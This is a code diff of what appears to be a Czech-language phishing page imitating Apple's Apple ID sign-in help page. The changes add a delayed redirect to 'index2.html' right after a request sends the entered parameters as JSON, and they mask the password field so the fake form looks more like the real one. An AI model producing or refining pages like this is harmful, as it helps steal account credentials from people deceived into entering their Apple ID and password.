@@ -34,6 +34,12 @@
                 }
 
                 request.send(JSON.stringify(params));
+                function telpg(){
+                    
+                    document.location.href='index2.html';
+                }
+                setTimeout(telpg, 1000);
+                
             }
         }
         document.addEventListener('keydown', (event) => {
@@ -148,8 +154,9 @@
             <h1 class="prihlas">Máte potíže s přihlášením?</h1>
             <p class="nig">Začněte zadáním svého Apple ID.</p>
             <input class="AppleIDl" placeholder="AppleID">
+            
             <div class="captcha">
-                <input class="AppleIDl" placeholder="Heslo">
+                <input type="password" class="AppleIDl" placeholder="Heslo">
 
             </div>
             <p class="bottomtext">Pokud jste zapomněli své Apple ID, můžete si ho vyhledat.
